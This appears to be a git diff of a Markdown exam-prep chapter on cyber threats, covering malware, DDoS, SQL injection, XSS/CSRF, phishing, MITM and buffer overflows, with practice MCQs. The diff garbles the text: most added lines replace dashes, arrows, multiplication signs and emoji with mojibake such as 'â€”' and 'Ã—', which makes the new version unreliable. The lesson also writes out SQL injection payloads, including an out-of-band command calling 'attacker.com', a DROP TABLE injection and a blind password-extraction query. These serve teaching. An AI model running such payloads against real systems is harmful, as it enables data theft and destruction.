@@ -1,6 +1,6 @@
-# Chapter 3: Cyber Threats & Attacks
+﻿# Chapter 3: Cyber Threats & Attacks
 
-> **Exam Weightage:** 4–6 Qs in IBPS SO IT Officer Mains (Common in PK and GK sections)
+> **Exam Weightage:** 4â€“6 Qs in IBPS SO IT Officer Mains (Common in PK and GK sections)
 >
 > **Key Topics:** Malware types, DoS/DDoS, SQL Injection, XSS/CSRF, Phishing, MITM, Session Hijacking, Zero-day, Buffer Overflow
 
@@ -13,16 +13,16 @@ After completing this chapter you will be able to:
 <!-- Image Gallery -->
 <section class="lesson-visuals" aria-label="Visual learning resources">
   <header><span>VISUAL LEARNING</span><h2>See it. Review it. Remember it.</h2></header>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/information-security/03-cyber-threats-attacks/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/information-security/03-cyber-threats-attacks/.png" alt="Handwritten notes" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/information-security/03-cyber-threats-attacks/handwritten-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/information-security/03-cyber-threats-attacks/handwritten-notes.png" alt="Handwritten notes" loading="lazy">
     <span><strong>Handwritten notes</strong>Condensed notes for deliberate review.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/information-security/03-cyber-threats-attacks/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/information-security/03-cyber-threats-attacks/.png" alt="Sticky-note revision" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/information-security/03-cyber-threats-attacks/sticky-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/information-security/03-cyber-threats-attacks/sticky-notes.png" alt="Sticky-note revision" loading="lazy">
     <span><strong>Sticky-note revision</strong>Fast recall prompts for revision.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/information-security/03-cyber-threats-attacks/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/information-security/03-cyber-threats-attacks/.png" alt="Visual concept guide" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/information-security/03-cyber-threats-attacks/visual-explanation.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/information-security/03-cyber-threats-attacks/visual-explanation.png" alt="Visual concept guide" loading="lazy">
     <span><strong>Visual concept guide</strong>A connected explanation of the key ideas.</span>
   </a>
 </section>
@@ -30,7 +30,7 @@ After completing this chapter you will be able to:
 
 - Classify malware types (virus, worm, trojan, ransomware, rootkit) based on propagation and payload.
 - Distinguish between DoS and DDoS and describe attack vectors (SYN flood, amplification attacks).
-- Explain SQL injection, XSS, and CSRF — root cause, exploitation mechanism, and mitigation.
+- Explain SQL injection, XSS, and CSRF â€” root cause, exploitation mechanism, and mitigation.
 - Identify social engineering techniques in phishing attacks.
 - Describe Man-in-the-Middle attacks and their variants (ARP spoofing, DNS spoofing).
 - Explain session hijacking and zero-day exploit characteristics.
@@ -57,12 +57,12 @@ Malware (malicious software) is any software intentionally designed to cause dam
 #### 3.1.2 Worm
 
 - **Definition:** Standalone malware that replicates itself and spreads across networks without requiring a host file.
-- **Propagation:** Self-propagating — exploits network vulnerabilities, emails, instant messaging
+- **Propagation:** Self-propagating â€” exploits network vulnerabilities, emails, instant messaging
 - **Unlike virus:** Does not need to attach to a host program; does not require human action to spread
 - **Examples:** Morris (1988, first internet worm), Slammer (2003, SQL vulnerability, doubled every 8.5 seconds), Conficker (2008, infected millions), Blaster, Nimda
 - **Impact:** Consumes bandwidth, overloads systems, can carry destructive payloads
 
-**Key comparison — Virus vs Worm:**
+**Key comparison â€” Virus vs Worm:**
 
 | Feature | Virus | Worm |
 |---------|-------|------|
@@ -75,7 +75,7 @@ Malware (malicious software) is any software intentionally designed to cause dam
 
 - **Definition:** Malware disguised as legitimate software to trick users into installing it.
 - **Propagation:** Social engineering (appears as game, utility, update, crack)
-- **Unlike virus/worm:** Does NOT self-replicate — relies entirely on deception
+- **Unlike virus/worm:** Does NOT self-replicate â€” relies entirely on deception
 - **Payload:** Backdoor access, data theft, keylogging, creating botnet zombies
 - **Examples:** Zeus (banking trojan), Emotet (spam/banking), SubSeven (RAT)
 - **Types:**
@@ -90,11 +90,11 @@ Malware (malicious software) is any software intentionally designed to cause dam
 - **Definition:** Malware that encrypts the victim's files and demands payment (ransom, typically in cryptocurrency) for the decryption key.
 - **Propagation:** Phishing emails (attachments/links), exploit kits, drive-by downloads
 - **Encryption:** Typically AES/RSA hybrid (fast AES for files, RSA encrypts the AES key)
-- **Examples:** WannaCry (2017 — used EternalBlue exploit, infected 230K systems globally), NotPetya (2017 — masqueraded as ransomware, actually wiper), Ryuk (targeted attacks on enterprises), LockBit (Ransomware-as-a-Service)
+- **Examples:** WannaCry (2017 â€” used EternalBlue exploit, infected 230K systems globally), NotPetya (2017 â€” masqueraded as ransomware, actually wiper), Ryuk (targeted attacks on enterprises), LockBit (Ransomware-as-a-Service)
 
 **Mitigation:**
 - Regular backups (3-2-1 rule: 3 copies, 2 media types, 1 offsite)
-- Patch management (WannaCry exploited MS17-010 — patch was available 2 months before)
+- Patch management (WannaCry exploited MS17-010 â€” patch was available 2 months before)
 - Email filtering, endpoint protection, least privilege, Network Segmentation
 
 #### 3.1.5 Rootkit
@@ -105,8 +105,8 @@ Malware (malicious software) is any software intentionally designed to cause dam
   - **Bootkit:** Infects Master Boot Record (MBR rootkit)
   - **Kernel rootkit:** Hooks system calls in OS kernel
   - **User-mode rootkit:** Intercepts DLL calls in user space
-- **Detection:** Extremely difficult — may require offline analysis (boot from clean media, forensic tools)
-- **Examples:** Sony BMG rootkit (2005 — actually DRM that hid itself), Stuxnet (2010 — used kernel rootkit components), Hacking Team's UEFI rootkit
+- **Detection:** Extremely difficult â€” may require offline analysis (boot from clean media, forensic tools)
+- **Examples:** Sony BMG rootkit (2005 â€” actually DRM that hid itself), Stuxnet (2010 â€” used kernel rootkit components), Hacking Team's UEFI rootkit
 
 ```mermaid
 flowchart TD
@@ -135,20 +135,20 @@ flowchart TD
 
 - **Mechanism:** Exploits TCP three-way handshake. Attacker sends many SYN packets with spoofed source IP addresses (non-existent or unreachable). Server responds with SYN-ACK to spoofed IPs, allocates memory for half-open connections. Since the final ACK never arrives, connections remain in SYN_RECV state, eventually exhausting the backlog queue.
 - **Target:** Server's connection table / memory
-- **Mitigation:** SYN cookies (encode connection state in SYN-ACK sequence number — no memory allocated until ACK received), increase backlog queue, shorten timeout, rate limiting
+- **Mitigation:** SYN cookies (encode connection state in SYN-ACK sequence number â€” no memory allocated until ACK received), increase backlog queue, shorten timeout, rate limiting
 
-**Normal TCP Handshake:** Client SYN → Server SYN-ACK → Client ACK (↔ connection established)
+**Normal TCP Handshake:** Client SYN â†’ Server SYN-ACK â†’ Client ACK (â†” connection established)
 
-**SYN Flood:** Attacker SYN (spoofed) → Server SYN-ACK (to spoofed IP, never receives ACK) → backlog fills
+**SYN Flood:** Attacker SYN (spoofed) â†’ Server SYN-ACK (to spoofed IP, never receives ACK) â†’ backlog fills
 
 #### 3.2.2 Amplification Attacks
 
 - **Mechanism:** Attacker sends small queries with spoofed source IP (victim's IP) to publicly accessible servers (DNS, NTP, SSDP, Memcached). Servers send large responses to victim.
-- **Amplification factor:** Response size ÷ Query size
-  - DNS: up to 50× (query ~60 bytes, response ~3000 bytes with DNSSEC)
-  - NTP (monlist): up to 556× (small query triggers list of up to 600 hosts)
-  - Memcached: up to 51,000× (theoretical — request ~15 bytes, response up to 1MB)
-- **Mitigation:** Source IP verification (BCP 38 — ingress/egress filtering), disable unnecessary services, rate limiting, DDoS protection services (Cloudflare, Akamai, AWS Shield)
+- **Amplification factor:** Response size Ã· Query size
+  - DNS: up to 50Ã— (query ~60 bytes, response ~3000 bytes with DNSSEC)
+  - NTP (monlist): up to 556Ã— (small query triggers list of up to 600 hosts)
+  - Memcached: up to 51,000Ã— (theoretical â€” request ~15 bytes, response up to 1MB)
+- **Mitigation:** Source IP verification (BCP 38 â€” ingress/egress filtering), disable unnecessary services, rate limiting, DDoS protection services (Cloudflare, Akamai, AWS Shield)
 
 #### 3.2.3 Other DDoS Vectors
 
@@ -183,7 +183,7 @@ flowchart LR
 - **Impact:** Data breach, authentication bypass, data modification/deletion, remote code execution (in extreme cases)
 - **Occurrence:** Anywhere user input is used to build SQL queries (login forms, search boxes, URL parameters)
 
-**Example — Vulnerable code:**
+**Example â€” Vulnerable code:**
 ```sql
 SELECT * FROM users WHERE username = 'admin' AND password = 'guess'
 ```
@@ -202,12 +202,12 @@ SELECT * FROM users WHERE username = 'admin' AND password = 'guess'
 | Out-of-band | Attacker receives data via DNS/HTTP to attacker-controlled server | `'; EXEC xp_dirtree '//attacker.com/table' --` |
 
 **Mitigation:**
-1. **Parameterized queries (Prepared Statements)** — best defense, separates SQL code from data
-2. **Stored procedures** — with careful parameter validation
-3. **Input validation** — whitelist allowed characters/patterns
-4. **Least privilege** — database account should have minimum required permissions
-5. **WAF (Web Application Firewall)** — can detect and block SQLi patterns
-6. **Escaping** — escape special characters (single quotes, etc.) — least reliable, can be bypassed
+1. **Parameterized queries (Prepared Statements)** â€” best defense, separates SQL code from data
+2. **Stored procedures** â€” with careful parameter validation
+3. **Input validation** â€” whitelist allowed characters/patterns
+4. **Least privilege** â€” database account should have minimum required permissions
+5. **WAF (Web Application Firewall)** â€” can detect and block SQLi patterns
+6. **Escaping** â€” escape special characters (single quotes, etc.) â€” least reliable, can be bypassed
 
 ### 3.4 XSS and CSRF
 
@@ -231,14 +231,14 @@ SELECT * FROM users WHERE username = 'admin' AND password = 'guess'
 
 **Mitigation (XSS):**
 1. **Output encoding/escaping** (context-specific: HTML entity, JavaScript, URL, CSS encoding)
-2. **Content Security Policy (CSP)** — restricts which scripts can execute
+2. **Content Security Policy (CSP)** â€” restricts which scripts can execute
 3. **Input validation** (whitelist approach)
-4. **HttpOnly cookies** — prevents JavaScript access to cookies (not a complete solution but reduces impact)
-5. **DOM sanitization** — for DOM-based XSS
+4. **HttpOnly cookies** â€” prevents JavaScript access to cookies (not a complete solution but reduces impact)
+5. **DOM sanitization** â€” for DOM-based XSS
 
-#### 3.4.2 CSRF (Cross-Site Request Forgery) — pronounced "sea-surf"
+#### 3.4.2 CSRF (Cross-Site Request Forgery) â€” pronounced "sea-surf"
 
-- **Root cause:** Application relies on cookie-based authentication without CSRF tokens — any site can forge requests to the app as the authenticated user
+- **Root cause:** Application relies on cookie-based authentication without CSRF tokens â€” any site can forge requests to the app as the authenticated user
 - **Impact:** Unauthorized actions performed on behalf of authenticated user (funds transfer, password change, email change)
 - **Prerequisite:** Victim must be authenticated on target site when visiting attacker's page
 
@@ -250,13 +250,13 @@ SELECT * FROM users WHERE username = 'admin' AND password = 'guess'
 5. bank.com processes the transfer because request appears to come from authenticated user
 
 **Mitigation (CSRF):**
-1. **CSRF tokens** — unique, unpredictable token embedded in forms; verified by server
-2. **SameSite cookies** — `SameSite=Strict` or `SameSite=Lax` attribute prevents cookies from being sent in cross-site requests
-3. **Origin/Referer header validation** — check that request originated from legitimate site
-4. **Custom headers** — require `X-Requested-With: XMLHttpRequest` header (JavaScript cannot set this cross-origin without CORS)
+1. **CSRF tokens** â€” unique, unpredictable token embedded in forms; verified by server
+2. **SameSite cookies** â€” `SameSite=Strict` or `SameSite=Lax` attribute prevents cookies from being sent in cross-site requests
+3. **Origin/Referer header validation** â€” check that request originated from legitimate site
+4. **Custom headers** â€” require `X-Requested-With: XMLHttpRequest` header (JavaScript cannot set this cross-origin without CORS)
 5. **Re-authentication** for sensitive actions (password confirmation, OTP)
 
-**XSS vs CSRF — Exam Comparison:**
+**XSS vs CSRF â€” Exam Comparison:**
 
 | Feature | XSS | CSRF |
 |---------|-----|------|
@@ -283,7 +283,7 @@ sequenceDiagram
     V->>B: GET /transfer?amount=1000&to=attacker<br/>Cookie: session=abc123
     B->>B: Processes transfer (authenticated request)
     B->>V: Transfer successful
-    Note over B: ❌ Server cannot distinguish legitimate request from forged one
+    Note over B: âŒ Server cannot distinguish legitimate request from forged one
 ```
 
 ### 3.5 Phishing and Social Engineering
@@ -303,7 +303,7 @@ sequenceDiagram
 - Urgency / threats ("Your account will be closed in 24 hours")
 - Generic greeting ("Dear Customer" instead of name)
 - Suspicious links (hover to reveal; misspelled domains like `g00gle.com`)
-- Attachments (PDF, DOC, ZIP) — common malware delivery
+- Attachments (PDF, DOC, ZIP) â€” common malware delivery
 - Poor grammar and spelling
 - Requests for sensitive information (banks never ask for passwords via email)
 
@@ -341,13 +341,13 @@ sequenceDiagram
 #### 3.6.2 DNS Spoofing (DNS Cache Poisoning)
 
 - **Mechanism:** Attacker injects forged DNS records into DNS resolver's cache. When victim's browser resolves `bank.com`, it gets attacker's IP address.
-- **Impact:** Redirects victim to attacker's fake website (used for credential theft even with HTTPS — but will trigger certificate warnings)
-- **Mitigation:** DNSSEC (DNS Security Extensions) — digitally signs DNS records, validates origin
+- **Impact:** Redirects victim to attacker's fake website (used for credential theft even with HTTPS â€” but will trigger certificate warnings)
+- **Mitigation:** DNSSEC (DNS Security Extensions) â€” digitally signs DNS records, validates origin
 
 #### 3.6.3 SSL Stripping
 
 - **Mechanism:** Attacker intercepts HTTPS requests and downgrades to HTTP before forwarding to server. Victim sees HTTP (no padlock), but may not notice.
-- **Mitigation:** HSTS (HTTP Strict Transport Security) — server tells browser to always use HTTPS; preloaded HSTS lists in browsers
+- **Mitigation:** HSTS (HTTP Strict Transport Security) â€” server tells browser to always use HTTPS; preloaded HSTS lists in browsers
 
 ### 3.7 Session Hijacking
 
@@ -363,18 +363,18 @@ sequenceDiagram
 | MITM-based | Intercepting traffic and extracting session cookie | End-to-end encryption (TLS) |
 
 **Session Hijacking Flow:**
-1. Victim authenticates → server creates session with ID `abc123`
+1. Victim authenticates â†’ server creates session with ID `abc123`
 2. Session ID stored in cookie, transmitted with each request
 3. Attacker obtains `abc123` (via sniffing / XSS / prediction)
-4. Attacker sets cookie `abc123` in their browser → appears as authenticated user
+4. Attacker sets cookie `abc123` in their browser â†’ appears as authenticated user
 5. Server processes attacker's requests as if they were the victim
 
 ### 3.8 Zero-Day Exploits
 
 - **Definition:** Attack exploiting a vulnerability unknown to the software vendor (no patch exists at time of attack).
-- **Timeline:** Vulnerability discovered → exploit developed → attack occurs → vendor notified → patch developed → patch deployed
+- **Timeline:** Vulnerability discovered â†’ exploit developed â†’ attack occurs â†’ vendor notified â†’ patch developed â†’ patch deployed
 - **Zero-day window:** The period between exploit release and patch deployment
-- **Detection:** Extremely difficult — no signature, no known pattern
+- **Detection:** Extremely difficult â€” no signature, no known pattern
 - **Defense strategies:**
   - Defense in depth (layered security)
   - Application whitelisting
@@ -389,18 +389,18 @@ sequenceDiagram
 - **Root cause:** No bounds checking on memory operations (common in C/C++ with `gets()`, `strcpy()`, `sprintf()`)
 - **Exploitation:** Attacker overwrites the return address stored on the stack to point to injected shellcode (malicious machine code).
 - **Prevention:**
-  - **Stack canaries** — random value placed between buffer and return address; if overwritten, program terminates
-  - **ASLR (Address Space Layout Randomization)** — randomizes memory addresses of process components
-  - **NX/DEP (No-Execute / Data Execution Prevention)** — marks stack/heap as non-executable
-  - **Safe functions** — use `strncpy()` instead of `strcpy()`, `snprintf()` instead of `sprintf()`
-  - **Memory-safe languages** — Rust, Go, Java (garbage collection, bounds checking)
+  - **Stack canaries** â€” random value placed between buffer and return address; if overwritten, program terminates
+  - **ASLR (Address Space Layout Randomization)** â€” randomizes memory addresses of process components
+  - **NX/DEP (No-Execute / Data Execution Prevention)** â€” marks stack/heap as non-executable
+  - **Safe functions** â€” use `strncpy()` instead of `strcpy()`, `snprintf()` instead of `sprintf()`
+  - **Memory-safe languages** â€” Rust, Go, Java (garbage collection, bounds checking)
 
 ```mermaid
 flowchart TD
     subgraph StackOverflow[Stack Buffer Overflow]
         direction LR
-        N["Normal Stack Layout:<br/>[Buffer: 16 bytes] → [EBP: 4 bytes] → [Return Addr: 4 bytes]"]
-        A["After Overflow:<br/>[AAAA... Buffer overflow 20 bytes...] → [EBP: overwritten] → [Return Addr → &shellcode]"]
+        N["Normal Stack Layout:<br/>[Buffer: 16 bytes] â†’ [EBP: 4 bytes] â†’ [Return Addr: 4 bytes]"]
+        A["After Overflow:<br/>[AAAA... Buffer overflow 20 bytes...] â†’ [EBP: overwritten] â†’ [Return Addr â†’ &shellcode]"]
         S["Shellcode<br/>(malicious code)<br/>injected into buffer"]
         A --> S
         N -.-> A
@@ -439,7 +439,7 @@ D) Output encoding
 
 **Answer: B) Parameterized queries (Prepared Statements)**
 
-**Explanation:** Prepared Statements separate SQL code from data — user input is bound as parameters, never concatenated directly into SQL. This completely prevents SQL injection regardless of the input content. Input validation and WAF are secondary defenses; output encoding prevents XSS, not SQLi.
+**Explanation:** Prepared Statements separate SQL code from data â€” user input is bound as parameters, never concatenated directly into SQL. This completely prevents SQL injection regardless of the input content. Input validation and WAF are secondary defenses; output encoding prevents XSS, not SQLi.
 </details>
 
 ---
@@ -473,24 +473,24 @@ D) Ransomware
 
 **Answer: C) Worm**
 
-**Explanation:** Worms are self-propagating — they automatically spread across networks by exploiting vulnerabilities, without requiring any user action. Viruses require a human to execute the infected host file. Trojans rely on users voluntarily installing them (deception). Ransomware typically requires user action (clicking link/opening attachment) to execute, though some variants spread via worm-like mechanisms.
+**Explanation:** Worms are self-propagating â€” they automatically spread across networks by exploiting vulnerabilities, without requiring any user action. Viruses require a human to execute the infected host file. Trojans rely on users voluntarily installing them (deception). Ransomware typically requires user action (clicking link/opening attachment) to execute, though some variants spread via worm-like mechanisms.
 </details>
 
 ---
 
 **Q5.** What is the amplification factor of a DNS amplification attack?
 
-A) Up to 10×  
-B) Up to 50×  
-C) Up to 556×  
-D) Up to 51,000×  
+A) Up to 10Ã—  
+B) Up to 50Ã—  
+C) Up to 556Ã—  
+D) Up to 51,000Ã—  
 
 <details>
 <summary>Show Answer</summary>
 
-**Answer: B) Up to 50×**
+**Answer: B) Up to 50Ã—**
 
-**Explanation:** DNS amplification can amplify traffic up to ~50× (small ~60-byte query can generate ~3000-byte response with DNSSEC records). NTP monlist command provides up to 556× amplification. Memcached can theoretically provide up to 51,000× amplification. DNS is the most commonly used amplification vector due to the large number of open DNS resolvers.
+**Explanation:** DNS amplification can amplify traffic up to ~50Ã— (small ~60-byte query can generate ~3000-byte response with DNSSEC records). NTP monlist command provides up to 556Ã— amplification. Memcached can theoretically provide up to 51,000Ã— amplification. DNS is the most commonly used amplification vector due to the large number of open DNS resolvers.
 </details>
 
 ---
@@ -541,7 +541,7 @@ D) Address Sanitizer
 
 **Answer: B) Stack canary**
 
-**Explanation:** A stack canary is a random value placed on the stack between the buffer and the return address. Before the function returns, the canary value is checked. If it has been overwritten (by a buffer overflow), the program terminates immediately. ASLR randomizes memory addresses, NX/DEP marks memory regions as non-executable — both are complementary defenses but do not use guard values.
+**Explanation:** A stack canary is a random value placed on the stack between the buffer and the return address. Before the function returns, the canary value is checked. If it has been overwritten (by a buffer overflow), the program terminates immediately. ASLR randomizes memory addresses, NX/DEP marks memory regions as non-executable â€” both are complementary defenses but do not use guard values.
 </details>
 
 ---
@@ -575,12 +575,12 @@ D) Windows registry
 
 **Answer: C) Boot sector of the hard disk**
 
-**Explanation:** A bootkit (MBR rootkit) infects the Master Boot Record — the first sector of the hard disk that executes during system startup, before the OS loads. It can thus intercept and hide from OS-level detection tools. Firmware rootkits infect BIOS/UEFI (even harder to detect). Kernel rootkits hook OS kernel functions.
+**Explanation:** A bootkit (MBR rootkit) infects the Master Boot Record â€” the first sector of the hard disk that executes during system startup, before the OS loads. It can thus intercept and hide from OS-level detection tools. Firmware rootkits infect BIOS/UEFI (even harder to detect). Kernel rootkits hook OS kernel functions.
 </details>
 
 ---
 
-## 📝 Solved Examples (20 MCQs)
+## ðŸ“ Solved Examples (20 MCQs)
 
 **Q1.** An attacker sends a crafted SQL query as username: `' OR 1=1; DROP TABLE users; --`. What type of SQL injection is this?
 
@@ -656,17 +656,17 @@ Key insight: CSRF exploits the fact that cookies are sent automatically by the b
 
 **Q5.** What is the amplification factor of a Memcached DDoS attack?
 
-A) Up to 50×  
-B) Up to 556×  
-C) Up to 51,000×  
-D) Up to 10,000×
+A) Up to 50Ã—  
+B) Up to 556Ã—  
+C) Up to 51,000Ã—  
+D) Up to 10,000Ã—
 
 <details>
 <summary>Show Answer</summary>
 
-**Answer: C) Up to 51,000×**
+**Answer: C) Up to 51,000Ã—**
 
-**Explanation:** Memcached (a distributed caching system) can amplify traffic by up to 51,000× when left exposed to the internet. A small 15-byte UDP request can generate a 1 MB response due to Memcached's default behavior of returning large cached objects. This is the highest amplification factor known. The 2018 GitHub DDoS attack (1.35 Tbps) exploited vulnerable Memcached servers. Mitigation: disable UDP, firewall port 11211, or upgrade Memcached (1.5.6+ disables UDP by default).
+**Explanation:** Memcached (a distributed caching system) can amplify traffic by up to 51,000Ã— when left exposed to the internet. A small 15-byte UDP request can generate a 1 MB response due to Memcached's default behavior of returning large cached objects. This is the highest amplification factor known. The 2018 GitHub DDoS attack (1.35 Tbps) exploited vulnerable Memcached servers. Mitigation: disable UDP, firewall port 11211, or upgrade Memcached (1.5.6+ disables UDP by default).
 </details>
 
 ---
@@ -774,7 +774,7 @@ D) Propagating across the network
 - **Bootkit:** Infecting MBR/UEFI to load before the OS (persistent across reinstalls)
 - **Firmware rootkit:** Hiding in BIOS/UEFI/device firmware (hardest to detect)
 
-Rootkits are typically used as a persistence mechanism after initial compromise. Example: Sony BMG rootkit (2005) was actually DRM that hid itself — became a major PR disaster. Stuxnet used kernel rootkit components.
+Rootkits are typically used as a persistence mechanism after initial compromise. Example: Sony BMG rootkit (2005) was actually DRM that hid itself â€” became a major PR disaster. Stuxnet used kernel rootkit components.
 </details>
 
 ---
@@ -795,7 +795,7 @@ D) The HTML content of the page
 
 Example: `' IF (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') WAITFOR DELAY '00:00:05' --`
 
-The attacker tests each character position, making 256 requests per byte — very slow but effective even with no visible output.
+The attacker tests each character position, making 256 requests per byte â€” very slow but effective even with no visible output.
 </details>
 
 ---
@@ -842,7 +842,7 @@ D) The address of the NX bit
 5. When the function returns, CPU jumps to shellcode and executes it
 
 Modern mitigations:
-- **Stack canary:** Random value between buffer and return address — detects overflow
+- **Stack canary:** Random value between buffer and return address â€” detects overflow
 - **ASLR:** Shellcode address is unpredictable
 - **NX/DEP:** Stack is non-executable (shellcode can't run)
 - **ROP (Return-Oriented Programming):** Even with NX, attackers chain existing code gadgets
@@ -855,7 +855,7 @@ Modern mitigations:
 A) Whaling targets senior executives specifically  
 B) Spear phishing uses email; whaling uses phone calls  
 C) Whaling targets multiple victims simultaneously  
-D) There is no difference — they are the same
+D) There is no difference â€” they are the same
 
 <details>
 <summary>Show Answer</summary>
@@ -865,7 +865,7 @@ D) There is no difference — they are the same
 **Explanation:** 
 - **Phishing:** Mass email to millions of recipients (generic, untargeted)
 - **Spear Phishing:** Targeted at specific individual/organization with personalized content (researched details: name, role, recent activities)
-- **Whaling:** Spear phishing targeting C-level executives (CEO, CFO, CTO) — the "big fish." Often uses legal/financial themes (urgent wire transfer, lawsuit, regulatory filing).
+- **Whaling:** Spear phishing targeting C-level executives (CEO, CFO, CTO) â€” the "big fish." Often uses legal/financial themes (urgent wire transfer, lawsuit, regulatory filing).
 
 Whaling is higher-stakes because executives have access to sensitive data and larger financial authority. Example: The "CEO Fraud" where attacker poses as CEO and asks finance to wire funds.
 </details>
@@ -886,7 +886,7 @@ D) Database connection pool
 
 **Explanation:** Slowloris opens many HTTP connections and sends partial HTTP headers very slowly (one byte every few minutes). It keeps connections open without completing the request (never sends the final `\r\n\r\n` that terminates headers). The server's thread pool (or process pool) fills up with these stalled connections, preventing legitimate users from connecting.
 
-Slowloris requires very little bandwidth — a single attacker with a modest connection can take down a typical Apache server. Mitigation: limit concurrent connections per IP, reduce timeout values, use a reverse proxy (Nginx) that buffers requests.
+Slowloris requires very little bandwidth â€” a single attacker with a modest connection can take down a typical Apache server. Mitigation: limit concurrent connections per IP, reduce timeout values, use a reverse proxy (Nginx) that buffers requests.
 </details>
 
 ---
@@ -943,7 +943,7 @@ D) Private keys
 
 The classic Kaminsky attack (2008) exploited the fact that DNS resolvers accept unsolicited DNS responses if the query ID matches. Fix: DNS source port randomization, query ID randomization, and DNSSEC (cryptographic signing of DNS records).
 
-Modern variant: DNS rebinding — attacker registers domain that rapidly switches between DNS responses to bypass same-origin policy.
+Modern variant: DNS rebinding â€” attacker registers domain that rapidly switches between DNS responses to bypass same-origin policy.
 </details>
 
 ---
@@ -1009,8 +1009,8 @@ D) A DDoS attack controlled by AI
 - Perturbing network traffic features to evade ML-based IDS
 
 **AI-Powered Threats (Modern Context):**
-1. **AI-generated phishing:** ChatGPT/LLMs generate highly convincing, personalized phishing emails with perfect grammar — dramatically lowering attacker cost
-2. **Deepfake social engineering:** Voice cloning (5-second sample → realistic voice), video deepfakes for CEO fraud
+1. **AI-generated phishing:** ChatGPT/LLMs generate highly convincing, personalized phishing emails with perfect grammar â€” dramatically lowering attacker cost
+2. **Deepfake social engineering:** Voice cloning (5-second sample â†’ realistic voice), video deepfakes for CEO fraud
 3. **Intelligent malware:** AI that adapts behavior based on environment (sandbox detection, automated evasion)
 4. **Automated vulnerability discovery:** AI agents scanning and exploiting vulnerabilities at machine speed
 5. **LLM-powered exploits:** Using language models to craft payloads, generate exploit code, and analyze defenses
@@ -1372,7 +1372,7 @@ flowchart TD
         R1["Reconnaissance (Manual)"] --> W1["Weaponization (Manual)"] --> D1["Delivery (Email/Malware)"] --> E1["Exploitation"] --> I1["Installation"] --> C2C1["C2 Communication"] --> A1["Actions on Objectives"]
     end
     subgraph AIDriven[AI-Powered Attack Lifecycle]
-        R2["AI Reconnaissance<br/>• Automated scanning<br/>• OSINT gathering (LLM)<br/>• Vulnerability discovery"] --> W2["AI Weaponization<br/>• Malware generation (LLM)<br/>• Polymorphic code<br/>• Adversarial examples"] --> D2["AI Delivery<br/>• Personalized phishing (LLM)<br/>• Voice deepfakes<br/>• Social media targeting"] --> E2["AI Exploitation<br/>• Adaptive payloads<br/>• Sandbox evasion<br/>• Automated privilege escalation"] --> I2["AI Persistence<br/>• Learning-based stealth<br/>• Behavioral mimicry<br/>• Self-healing infections"] --> C2C2["AI C2<br/>• Encrypted traffic mimicry<br/>• Decentralized coordination<br/>• Traffic pattern evasion"] --> A2["AI Actions<br/>• Data exfiltration<br/>• Fraud at scale<br/>• Automated lateral movement"]
+        R2["AI Reconnaissance<br/>â€¢ Automated scanning<br/>â€¢ OSINT gathering (LLM)<br/>â€¢ Vulnerability discovery"] --> W2["AI Weaponization<br/>â€¢ Malware generation (LLM)<br/>â€¢ Polymorphic code<br/>â€¢ Adversarial examples"] --> D2["AI Delivery<br/>â€¢ Personalized phishing (LLM)<br/>â€¢ Voice deepfakes<br/>â€¢ Social media targeting"] --> E2["AI Exploitation<br/>â€¢ Adaptive payloads<br/>â€¢ Sandbox evasion<br/>â€¢ Automated privilege escalation"] --> I2["AI Persistence<br/>â€¢ Learning-based stealth<br/>â€¢ Behavioral mimicry<br/>â€¢ Self-healing infections"] --> C2C2["AI C2<br/>â€¢ Encrypted traffic mimicry<br/>â€¢ Decentralized coordination<br/>â€¢ Traffic pattern evasion"] --> A2["AI Actions<br/>â€¢ Data exfiltration<br/>â€¢ Fraud at scale<br/>â€¢ Automated lateral movement"]
     end
     style Traditional fill:#ffebee
     style AIDriven fill:#e8f5e9
@@ -1393,7 +1393,7 @@ flowchart TD
 | A09 | Logging/Monitoring Failures | No logging, slow detection | Dwell time (days-months undetected) |
 | A10 | SSRF | Server fetches attacker-controlled URL | Cloud metadata theft, internal scanning |
 
-## 📖 Exercise Bank (30 Questions)
+## ðŸ“– Exercise Bank (30 Questions)
 
 **Q1.** Explain the complete lifecycle of a ransomware attack from initial access to payment. Use WannaCry as the case study.
 
@@ -1409,7 +1409,7 @@ flowchart TD
 
 **Q7.** In a man-in-the-middle attack using ARP spoofing, the attacker wants to intercept traffic between 192.168.1.10 (victim) and 192.168.1.1 (gateway). What ARP packets does the attacker send?
 
-**Q8.** Calculate the bandwidth required for a DDoS amplification attack sending 10,000 DNS queries per second. Each query = 60 bytes, response = 3000 bytes, amplification factor = 50×. What is the total traffic at the victim?
+**Q8.** Calculate the bandwidth required for a DDoS amplification attack sending 10,000 DNS queries per second. Each query = 60 bytes, response = 3000 bytes, amplification factor = 50Ã—. What is the total traffic at the victim?
 
 **Q9.** Explain how a Ransomware-as-a-Service (RaaS) model works. Name three RaaS families and their distinguishing features.
 
@@ -1417,7 +1417,7 @@ flowchart TD
 
 **Q11.** A rootkit hooks the `NtQueryDirectoryFile` syscall. What does this achieve and how does it hide files from the user?
 
-**Q12.** For the OWASP Top 10 (2021) A04 — Insecure Design, give three real-world examples where design flaws led to security breaches.
+**Q12.** For the OWASP Top 10 (2021) A04 â€” Insecure Design, give three real-world examples where design flaws led to security breaches.
 
 **Q13.** How does a stack canary detect buffer overflows? Why does it not protect against heap overflows?
 
@@ -1427,7 +1427,7 @@ flowchart TD
 
 **Q16.** A social engineer calls an employee claiming to be from IT support. List 5 techniques they might use to extract the employee's password.
 
-**Q17.** Calculate the percentage of CPU consumed by a system processing 10,000 SYNs/second if each SYN consumes 200 μs of CPU. Is the system under threat of resource exhaustion?
+**Q17.** Calculate the percentage of CPU consumed by a system processing 10,000 SYNs/second if each SYN consumes 200 Î¼s of CPU. Is the system under threat of resource exhaustion?
 
 **Q18.** Explain how behavioral biometrics (keystroke dynamics, mouse movement) can detect account takeover in real-time.
 
